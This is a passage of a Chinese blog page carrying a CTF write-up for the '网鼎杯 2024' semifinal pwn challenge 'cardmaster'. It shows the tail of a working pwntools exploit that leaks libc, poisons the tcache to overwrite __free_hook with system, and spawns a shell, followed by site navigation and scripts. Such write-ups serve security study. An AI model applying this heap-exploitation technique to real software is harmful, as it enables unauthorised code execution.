p.recvuntil(<span class="string">b&quot;count&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;range&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(card_range).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;level&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(level).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;set&quot;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_card</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">init_card()</span><br><span class="line">set_info(<span class="number">0x300</span>,<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">set_info(<span class="number">0x0</span>,<span class="number">1</span>,<span class="number">0x600</span>)</span><br><span class="line">get_info()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;suit chara set:&quot;</span>)</span><br><span class="line">leak_info = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;leak_info is ==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak_info)&#125;</span>&#x27;</span>)</span><br><span class="line">libc_base = leak_info - <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">init_card()</span><br><span class="line">count = <span class="number">21</span></span><br><span class="line">set_info(count, <span class="number">1</span>, <span class="number">0x610</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">12</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">set_info(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0x610</span>)</span><br><span class="line">set_info(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0x610</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;free_hook is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&#x27;</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;system is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">set_info(count, <span class="number">0</span>, <span class="number">0x610</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">init_card()</span><br><span class="line">set_info(count, <span class="number">1</span>, <span class="number">0x610</span>, <span class="string">b&quot;BBBBBBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">init_card()</span><br><span class="line">set_info(count, <span class="number">1</span>, <span class="number">0x610</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">init_card()</span><br><span class="line">set_info(count, <span class="number">1</span>, <span class="number">0x610</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">set_info(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0x610</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wangdingbei-2024-semifinal-pwn/img-006.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/HFTTC.github.io/images/pwn/covers/ningbo-xihu-2026-pwn.jpg" data-sizes="auto" alt="第九届宁波市网络安全&amp;西湖论剑 PWN 2026" class="lazyload">
+      <a href="/HFTTC.github.io/2026/08/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%AE%81%E6%B3%A2%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn-2026/" aria-label="后一篇: 第九届宁波市网络安全&amp;西湖论剑 PWN 2026"  title="后一篇: 第九届宁波市网络安全&amp;西湖论剑 PWN 2026"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          第九届宁波市网络安全&amp;西湖论剑 PWN 2026
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        283.4k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        23:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1-cardmaster"><span class="toc-number">1.</span> <span class="toc-text">PWN1-cardmaster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">EXP 思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">147</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="/HFTTC.github.io/js/lazyload-local.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "网鼎杯 2024 半决赛 PWN",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn/",
+          excerpt: "",
+          description: "",
+          stripContent: "网鼎杯的题目决定先复现一道，cardmaster 这道题目总体来说是逆向难度比较大，指针比较乱，漏洞利用逻辑就是 glibc2.27 版本下的 UAF 和 teache_poisioning。另一道题目是一个内核题，决定再学习一段时间内核再去复现感觉效果会更好。  PWN1-cardmaster    看下初始化的一些基本信息： 先开辟 0x28 大小的空间，地址存放在 v4。再开辟 0x20 大小的空间，地址存放在 v4[4]。 可以把 v4[4] 看做一个链表，开辟一个 0xD0 大小的空间",
+          date: "Thu Aug 27 2026 00:00:00 GMT+0800",
+          updated: "Thu Aug 27 2026 17:59:31 GMT+0800",
+          cover: "/HFTTC.github.io/images/pwn/covers/wangdingbei-2024-semifinal-pwn.jpg",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
